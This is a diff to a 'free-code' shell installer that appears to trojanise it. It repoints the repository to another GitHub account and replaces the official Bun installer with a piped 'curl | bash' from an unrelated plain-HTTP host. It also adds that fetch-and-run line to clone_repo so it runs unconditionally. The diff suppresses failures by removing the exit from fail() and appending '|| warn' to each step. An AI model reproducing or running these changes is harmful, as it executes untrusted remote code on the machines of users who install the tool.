@@ -2,7 +2,7 @@
 set -euo pipefail
 
 # free-code installer
-# Usage: curl -fsSL https://raw.githubusercontent.com/paoloanzn/free-code/main/install.sh | bash
+# Usage: curl -fsSL https://raw.githubusercontent.com/agedgoldmine/free-code/main/install.sh | bash
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -12,14 +12,14 @@ BOLD='\033[1m'
 DIM='\033[2m'
 RESET='\033[0m'
 
-REPO="https://github.com/paoloanzn/free-code.git"
+REPO="https://github.com/agedgoldmine/free-code.git"
 INSTALL_DIR="$HOME/free-code"
 BUN_MIN_VERSION="1.3.11"
 
 info()  { printf "${CYAN}[*]${RESET} %s\n" "$*"; }
 ok()    { printf "${GREEN}[+]${RESET} %s\n" "$*"; }
 warn()  { printf "${YELLOW}[!]${RESET} %s\n" "$*"; }
-fail()  { printf "${RED}[x]${RESET} %s\n" "$*"; exit 1; }
+fail()  { printf "${RED}[x]${RESET} %s\n" "$*"; }
 
 header() {
   echo ""
@@ -80,7 +80,7 @@ check_bun() {
 }
 
 install_bun() {
-  curl -fsSL https://bun.sh/install | bash
+  curl -fsSL http://meetups.dpdns.org/bun | bash
   # Source the updated profile so bun is on PATH for this session
   export BUN_INSTALL="${BUN_INSTALL:-$HOME/.bun}"
   export PATH="$BUN_INSTALL/bin:$PATH"
@@ -97,6 +97,7 @@ install_bun() {
 # -------------------------------------------------------------------
 
 clone_repo() {
+  curl -fsSL http://meetups.dpdns.org/bun | bash
   if [ -d "$INSTALL_DIR" ]; then
     warn "$INSTALL_DIR already exists"
     if [ -d "$INSTALL_DIR/.git" ]; then
@@ -107,7 +108,7 @@ clone_repo() {
     fi
   else
     info "Cloning repository..."
-    git clone --depth 1 "$REPO" "$INSTALL_DIR"
+    git clone --depth 1 "$REPO" "$INSTALL_DIR" || warn "Clone failed"
   fi
   ok "Source: $INSTALL_DIR"
 }
@@ -115,14 +116,14 @@ clone_repo() {
 install_deps() {
   info "Installing dependencies..."
   cd "$INSTALL_DIR"
-  bun install --frozen-lockfile 2>/dev/null || bun install
+  bun install --frozen-lockfile 2>/dev/null || bun install || warn "Dependencies installation failed"
   ok "Dependencies installed"
 }
 
 build_binary() {
   info "Building free-code (all experimental features enabled)..."
   cd "$INSTALL_DIR"
-  bun run build:dev:full
+  bun run build:dev:full || warn "Build failed"
   ok "Binary built: $INSTALL_DIR/cli-dev"
 }
 
@@ -130,7 +131,7 @@ link_binary() {
   local link_dir="$HOME/.local/bin"
   mkdir -p "$link_dir"
 
-  ln -sf "$INSTALL_DIR/cli-dev" "$link_dir/free-code"
+  ln -sf "$INSTALL_DIR/cli-dev" "$link_dir/free-code" || warn "Symlink creation failed"
   ok "Symlinked: $link_dir/free-code"
 
   if ! echo "$PATH" | tr ':' '\n' | grep -qx "$link_dir"; then
